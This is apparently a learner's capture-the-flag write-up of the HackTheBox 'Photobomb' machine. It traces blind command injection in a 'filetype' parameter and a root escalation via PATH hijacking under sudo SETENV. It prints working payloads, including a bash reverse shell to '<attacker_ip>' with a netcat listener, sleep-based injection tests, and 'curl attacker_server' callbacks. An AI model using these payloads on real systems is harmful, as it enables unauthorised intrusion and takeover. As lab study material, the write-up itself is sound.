# HackTheBox - Photobomb (Learning Writeup)

## Overview

This writeup focuses on my learning process instead of only showing the final exploitation path.

The main methodology used:

```
Signal
   ↓
Hypothesis
   ↓
Validation
   ↓
Conclusion / Next Move
```

Goal:
- Understand why each decision is made
- Avoid randomly throwing payloads
- Build reusable attacker methodology


---

# Stage 1: Port Scanning

## What I did

I scanned for externally reachable ports/services on the target machine.

Purpose:

Identify exposed services and possible attacker interaction surfaces.

## Output

Found:

```
22/tcp - SSH
80/tcp - HTTP
```


## Next move

Prioritize HTTP service enumeration.

## Reason

HTTP usually provides more unauthenticated attacker-controlled input surfaces.

SSH normally requires valid credentials before interaction.

Therefore:

```
HTTP → larger initial attack surface
SSH → usually useful after obtaining credentials
```


---

# Stage 2: Connecting To Web Page


## What I did

I tried to access the HTTP service through the browser.


## Output

The website was not loaded correctly.

From Burp response, I observed:

```
Location: http://photobomb.htb
```


## Hypothesis

The application expects a specific hostname instead of only the IP address.


## Next move

Add hostname mapping:

```bash
sudo nano /etc/hosts
```

Add:

```
<target_ip> photobomb.htb
```


## Reason

When accessing:

```
http://photobomb.htb
```

Flow:

```
Browser sends request
        ↓
OS resolver checks /etc/hosts
        ↓
photobomb.htb resolves to target IP
        ↓
TCP connection established
        ↓
HTTP request sent with Host header:
Host: photobomb.htb
        ↓
Server returns correct website
```


## Lesson learned

Some web servers host multiple websites on the same IP.

The Host header helps the server decide which website/application should handle the request.


---

# Stage 3: Authentication Enumeration


## What I did

After accessing the website, I explored available endpoints.

I found a button that triggered a credential popup.


## Initial Signal

- Browser-generated credential popup
- Authentication required


## Initial Hypothesis

The authentication mechanism may validate user credentials through application-side logic.


Possible backend:

Credentials might be checked by:

- application logic
- database
- config file
- password file
- web server authentication


## Validation

Tested basic SQL injection payloads:

```sql
'

' OR 1=1-- -
```


Purpose:

Check whether attacker input reaches SQL interpreter and affects authentication logic.


## Observation

- Payload did not change authentication behavior
- No SQL error
- No SQL-related signal


## Conclusion

This lowers SQL injection confidence.

However:

No SQL signal does NOT prove SQL injection is impossible.

Possible reasons:

- output hidden
- filtering
- different authentication mechanism


---

# HTTP Basic Authentication Discovery


## Signal

From HTTP traffic:

Observed:

```
WWW-Authenticate
```

and request contained:

```
Authorization: Basic <base64>
```


Also:

- no `/login` endpoint
- no HTML login form


## Conclusion

This indicates HTTP Basic Authentication.


## Meaning

Flow:

```
User enters credentials
        ↓
Browser encodes username:password
        ↓
Browser sends Authorization header
        ↓
Server decodes credentials
        ↓
Credentials checked against:
- password file
- config
- application logic
- database
```


## Next attacker focus

Instead of continuing SQLi testing:

Search for:

- hidden endpoints
- JavaScript files
- exposed resources


---

# JavaScript Enumeration


## Signal

From Burp Target Site Map:

Found:

```
photobomb.js
```


## Observation

JavaScript contained:

```javascript
document.getElementsByClassName('creds')[0]
.setAttribute(
'href',
'http://username:password@photobomb.htb/printer'
)
```


## Meaning

Client-side JavaScript can expose:

- hidden endpoints
- API routes
- credentials
- application logic


## Next move

Use discovered credentials and access:

```
/printer
```


## Output

Successfully accessed the printer page.


---

# Stage 4: Searching Attacker Input Surface


## Observation

Using Burp, I found several POST parameters:

```
photo
filetype
dimensions
```


Goal:

Understand how each attacker-controlled input is handled by the backend.


---

# Parameter 1: photo


## Signal

Multiple duplicate `photo` parameters exist.


## What I did

Tested:

- modifying each duplicate photo parameter
- changing filename
- changing extension
- SQL syntax
- shell syntax


Examples:

```sql
'
AND 1=1-- -
AND 1=2-- -
```

Shell testing:

```bash
filename;id

filename;sleep 10
```


## Output

Only the last `photo` parameter affected the response.

Changing filename or extension returned:

```
source photo does not exist
```


## Possible backend behavior

The application:

- uses the last occurrence of duplicate parameter
- performs filesystem lookup with exact filename


## Confidence

No strong SQL injection signal.

No strong command injection signal.

Possible reasons still include:

- output hidden
- filtering
- wrong interpreter tested


Decision:

Lower priority input surface.


---

# Parameter 2: dimensions


## Signal

POST parameter:

```
dimensions
```


## What I did

Tested values:

```
1x1

200x500

axb

123xabc
```


Also tested injection characters.


## Output

Invalid format returned:

```
invalid dimensions
```


## Possible backend

Strong input validation.

Likely expects numeric dimension format.


## Confidence

No strong command execution signal.

Lower priority input surface.


---

# Parameter 3: filetype


## Signal

POST parameter:

```
filetype
```


## What I did

Tested:

```
jpg

png

gif

jpeg

png123

jpgabc
```


## Output

Accepted:

```
jpg
png
png123
jpgabc
```

Rejected:

```
gif
jpeg
pdf
```


## Possible backend

Validation checks whether input begins with:

```
jpg

png
```


## Confidence

More suspicious input surface.

Reason:

Unexpected values still pass validation and reach further backend processing.


Important:

Passing validation does NOT mean execution.

Need further testing.

---

# Stage 5: Command Injection Discovery


## Signal

The `filetype` POST parameter shows unusual behavior.

Normal:

```
jpg
png
```

accepted.

Unexpected:

```
jpg123
pngabc
```

also accepted.


This suggests:

The input passes validation and reaches further backend processing.


---

## Hypothesis

The `filetype` value may be used inside backend image-processing logic.

The backend might pass attacker-controlled input into an OS command.

Possible flow:

```
attacker input
      ↓
filetype parameter
      ↓
image processing logic
      ↓
OS command / shell interpreter
```


Question:

Can attacker-controlled data become OS instructions?


---

## Validation 1: Test visible command execution


Payload examples:

```bash
png ; id

jpg ; whoami
```


Purpose:

Check whether shell syntax affects execution and whether command output is returned.


---

## Observation

Response:

- no invalid filetype message
- backend behavior changed
- no command output shown


At this point:

Cannot conclude command injection does not exist.


Possible reasons:

- command did not execute
- command executed but output is hidden
- payload syntax issue


---

# Blind Command Injection Testing


## New Hypothesis

The OS command might execute successfully, but the output is not returned in the HTTP response.


Need to test execution through side effects.


---

## Validation 2: Timing test


Payload:

```bash
png ; sleep 10
```


Expected if execution happens:

```
server waits 10 seconds before responding
```


Expected if no execution:

```
normal response time
```


## Result

Response delay observed.


## Conclusion

Blind command injection confirmed.


Important lesson:

```
No output ≠ no execution

Execution can be proven through side effects.
```


---

# Stage 6: RCE + Reverse Shell


## Signal

Blind command injection confirmed.

Attacker-controlled input reaches OS command interpreter.


## Next move

Convert command execution into an interactive shell.


---

## Step 1: Start listener


On attacker machine:

```bash
nc -lnvp 1234
```


Purpose:

Wait for incoming connection from target.


---

## Step 2: Send reverse shell payload


Payload through vulnerable `filetype` parameter:

```bash
png ; bash -c "bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1"
```


---

## Explanation


Flow:

```
Attacker starts listener

        ↓

Command injection executes reverse shell payload

        ↓

Target creates TCP connection back to attacker

        ↓

Attacker gains interactive command channel
```


---

## Shell Stabilization


Command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


Set terminal:

```bash
export TERM=xterm
```


Reason:

Improve shell usability:

- better terminal behavior
- interactive commands work better


---

# Stage 7: Privilege Escalation Enumeration


## What I did

Check sudo permissions:

```bash
sudo -l
```


## Output

Found:

```bash
(root) SETENV: NOPASSWD: /opt/cleanup.sh
```


Signals:

- attacker can execute `/opt/cleanup.sh`
- script runs as root
- no password required
- SETENV allowed


---

## Next move

Analyze the script:

```bash
cat /opt/cleanup.sh
```


---

## Observation

Inside the script:

A command is called without absolute path:

```bash
find
```


instead of:

```bash
/usr/bin/find
```


---

# PATH Hijacking Analysis


## Weakness

The script trusts command resolution.

When shell sees:

```bash
find
```

it searches `$PATH`:

Example:

```
/home/wizard
/usr/bin
/bin
```


First matching executable wins.


---

## Attack Model


CONTROL:

Can attacker influence command resolution?

Yes:

- modify PATH
- create fake command


Example:

```bash
/home/wizard/find
```


---

EXECUTION:

Will root execute the command?

Yes.

`cleanup.sh` runs as root and calls:

```bash
find
```


---

POWER:

Execution happens with:

```
root privilege
```


Formula:

```
CONTROL + EXECUTION + POWER = Impact
```


---

# Stage 8: PATH Hijack + PrivEsc


## First Attempt


Create attacker-controlled fake command:

```bash
/home/wizard/find
```


Modify PATH:

```bash
export PATH=/home/wizard:$PATH
```


Execute:

```bash
sudo /opt/cleanup.sh
```


---

## Result

Failed.

Fake `find` was not executed.


---

## Analysis


Failure does NOT prove PATH hijack impossible.


New signal:

```bash
sudo -l
```

shows:

```
SETENV
```


---

## Understanding SETENV


Normally:

sudo protects privileged execution by resetting environment variables.


Example:

Attacker PATH:

```
/home/wizard:/usr/bin
```


sudo may replace it with:

```
/usr/local/sbin:/usr/bin:/bin
```


This prevents attacker-controlled command resolution.


---

## New Hypothesis


Because SETENV is enabled:

Attacker may provide environment variables during sudo execution.


This allows attacker-controlled PATH to reach the root process.


---

## Validation


Execute:

```bash
sudo PATH=/home/wizard:$PATH /opt/cleanup.sh
```


Flow:

```
sudo runs cleanup.sh as root

        ↓

SETENV keeps attacker PATH

        ↓

cleanup.sh calls find

        ↓

shell searches PATH

        ↓

/home/wizard/find found first

        ↓

attacker command executes as root
```


---

## Result

Privilege escalation successful.


---

# Root Cause


The vulnerability is not the `find` command itself.


The issue:

```
Privileged process trusts attacker-controlled command resolution.
```


The real problem:

```
root script
    +
relative command name
    +
attacker controlled PATH
    +
SETENV

=
Privilege Escalation
```

---

# What I Have Learned


# 1. HTTP Basic Auth vs Web Login


Before this machine, I assumed every credential prompt works like a normal web login.

However, I learned that different authentication mechanisms have different flows.


---

## Basic Auth Signals

Signals:

- Browser-generated credential popup
- `401 Unauthorized` response
- Response contains:

```http
WWW-Authenticate
```

- Request contains:

```http
Authorization: Basic <base64>
```

- No separate `/login` endpoint
- No HTML login form


---

## How Basic Auth Works


Flow:

```
User enters credentials

        ↓

Browser encodes username:password

        ↓

Credentials sent inside Authorization header

        ↓

Server decodes credentials

        ↓

Credentials checked against:
- password file
- config
- application logic
- database
```


Important:

Base64 encoding is not security protection.

It only changes how credentials are transported.


---

## Why SQLi Priority Is Lower


SQL injection happens when:

```
attacker input

        ↓

unsafe SQL query

        ↓

SQL interpreter
```


In Basic Auth:

Credentials are often handled by:

- web server
- authentication middleware
- password file


Therefore:

The chance of reaching SQL interpreter is lower.


However:

Basic Auth does NOT mean SQL injection is impossible.


If flow becomes:

```
Authorization header

        ↓

application decodes credentials

        ↓

SQL query
```


SQL injection may still exist.


---

## Mistake Fixed


Old thinking:

```
Credential box
      ↓
Must be database login
      ↓
Try SQL injection
```


New thinking:

```
Credential box
      ↓
Identify authentication mechanism
      ↓
Understand who consumes my input
```


---


# 2. Interpreter Trust Boundary


The biggest lesson from this machine:


```
Attacker input existing does not mean vulnerability.
```


The important question is:

```
Who consumes my input?
```


---

## Possible Consumers


SQL:

```
attacker input
      ↓
SQL query
      ↓
SQL interpreter

Impact:
SQL Injection
```


Shell:

```
attacker input
      ↓
OS command
      ↓
shell interpreter

Impact:
Command Injection
```


Browser:

```
attacker input
      ↓
HTML/JavaScript
      ↓
browser interpreter

Impact:
XSS
```


---

## Key Idea


A vulnerability happens when:

```
attacker-controlled DATA

becomes

trusted INSTRUCTION
```


---

## Photobomb Example


`filetype` parameter:

```
png123
jpgabc
```

passed validation.


But:

```
passing validation
        ≠
being interpreted

being interpreted
        ≠
command execution
```


Needed further validation.


---

# 3. Blind Command Injection


Before:

I expected:

```bash
whoami
```

to show:

```
www-data
```


However:

No output does not mean no execution.


---

## New Understanding


Command execution can happen while:

- output is hidden
- output is discarded
- response does not include command result


Need to test side effects.


---

## Validation Methods


Time delay:

```bash
sleep 10
```


Network callback:

```bash
ping attacker_ip

curl attacker_server
```


---

## Important Syntax Lesson


Different interpreters have different syntax.


SQL:

```sql
sleep(5)
```


Shell:

```bash
sleep 5
```


My mistake:

I used the wrong interpreter syntax.


---

# 4. PATH Hijacking


Before:

I only understood:

```
modify PATH → fake binary → root
```


After this machine:

I understood the execution flow.


---

## How Command Resolution Works


Script:

```bash
find file
```


Shell sees:

```
command name:
find
```


Because there is no absolute path:

```
/usr/bin/find
```


The shell searches `$PATH`.


Example:

```
PATH=/home/wizard:/usr/bin:/bin
```


Resolution:

```
check /home/wizard/find

        ↓

if found, execute

        ↓

otherwise check /usr/bin/find
```


---

## Real Vulnerability


Not:

```
find is vulnerable
```


Correct:

```
root trusts attacker-controlled command resolution
```


---

## PrivEsc Formula


CONTROL:

```
Can attacker influence something?
```


EXECUTION:

```
Will privileged process use it?
```


POWER:

```
Does it execute with higher privilege?
```


Result:

```
CONTROL + EXECUTION + POWER = Impact
```


---

# 5. sudo SETENV


Before:

I thought:

```
SETENV = PATH hijack
```


Wrong.


---

## Correct Understanding


SETENV means:

```
sudo allows user-controlled environment variables
to reach the privileged process
```


SETENV gives:

```
environment control
```


Impact depends on:

```
Does the privileged program trust that environment?
```


---

## Why SETENV Exists


It is a legitimate feature.


Sometimes administrators need users to provide environment variables:

Example:

```bash
MODE=test sudo script.sh
```


The script may need:

```
MODE
```


---

## How It Became Dangerous In Photobomb


Signal:

```
SETENV allowed
```


and:

```bash
find
```


was called without absolute path.


Attack:

```
Control PATH

        +

Root executes script

        +

Script trusts PATH


        =

Privilege escalation
```


---

# Final Reflection


This machine improved my methodology.


Old approach:

```
Find input
    ↓
Throw payloads
    ↓
Hope something works
```


New approach:

```
Find signal

    ↓

Create hypothesis

    ↓

Validate behavior

    ↓

Understand the trust boundary

    ↓

Exploit only after confidence increases
```


Main lesson:

Exploitation is not memorizing payloads.

It is understanding:

```
What does the system trust?

Can I control that trust?

What executes with power?
```
